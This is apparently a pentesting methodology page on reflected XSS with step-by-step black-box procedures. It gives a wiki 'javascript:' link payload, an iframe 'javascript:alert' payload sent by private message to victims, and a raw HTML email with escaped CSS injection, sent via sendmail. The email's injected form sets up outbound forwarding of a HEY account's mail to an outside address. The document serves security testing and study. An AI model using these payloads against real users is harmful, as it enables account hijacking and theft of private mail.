# Reflected Cross Site Scripting

## Check List

## Methodology

### Black Box

#### XSS Reflected

{% stepper %}
{% step %}
Log in to any platform that allows creating or editing text-based pages (such as a Wiki or documentation system)
{% endstep %}

{% step %}
Create a new page
{% endstep %}

{% step %}
In the field for the page identifier or slug, enter `javascript:`
{% endstep %}

{% step %}
Configure the page as follows

Title: `javascript:`

Format: Markdown

Content: `[XSS](.alert(1);)`
{% endstep %}

{% step %}
Save or publish the page
{% endstep %}

{% step %}
After the page is created, click the link labeled “XSS” in the page content
{% endstep %}

{% step %}
If the system is vulnerable, the JavaScript code will execute (e.g., an `alert(1)` will appear)
{% endstep %}
{% endstepper %}

***

#### XSS IN Email

{% stepper %}
{% step %}
Create a new text file (e.g. `email.txt`)
{% endstep %}

{% step %}
Put the following exact contents into the file (including headers and `Content-type: text/html`)

```http
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
```
{% endstep %}

{% step %}
Send the email using `sendmail` on Linux as an example

```bash
/usr/sbin/sendmail -t < email.txt
```

(or use any other tool capable of sending raw MIME/HTML emails)
{% endstep %}

{% step %}
Open the recipient’s HEY account and load the sent email (refresh the inbox/viewer if needed)
{% endstep %}

{% step %}
Inspect the rendered HTML to find injected tags or form elements (e.g. injected `<form ...>` or `<iframe ...>`)
{% endstep %}

{% step %}
Observe any automatic behaviors triggered by the injected HTML (such as POST requests to create forwarding or a full-window iframe)
{% endstep %}

{% step %}
Repeat with the alternative payload examples from the report (iframe-based spoof or `<script src=...>` + hcaptcha payload) to verify other exploitation vectors
{% endstep %}
{% endstepper %}

***

####

{% stepper %}
{% step %}
Go to another users profile
{% endstep %}

{% step %}
Click private message
{% endstep %}

{% step %}
Type any subject
{% endstep %}

{% step %}
Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
{% endstep %}

{% step %}
Send the message
{% endstep %}

{% step %}
View the message (triggers the XSS)
{% endstep %}

{% step %}
Wait for the victim to read the message
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
